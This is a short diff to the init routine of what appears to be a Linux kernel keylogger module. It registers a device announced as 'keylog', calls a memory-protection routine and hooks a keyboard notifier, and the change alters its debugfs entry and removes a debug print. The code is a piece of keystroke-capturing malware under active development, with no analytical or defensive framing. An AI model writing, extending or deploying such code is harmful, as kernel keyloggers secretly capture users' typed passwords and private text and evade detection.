@@ -609,7 +609,7 @@ static int __init kl_init(void)
 	if (!subdir)
 		return -ENOENT;
 
-	file = debugfs_create_file("log", 0400, subdir, NULL, &fops);
+	file = debugfs_create_u16("major", 0400, subdir, &major);
 	if (!file) {
 		debugfs_remove_recursive(subdir);
 		return -ENOENT;
@@ -621,7 +621,6 @@ static int __init kl_init(void)
 		return ret;
 	}
 	major = ret;
-    pr_debug("%d", major);
 	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
 	protect_memory();
 	ret = register_keyboard_notifier(&kl_notifier_block);
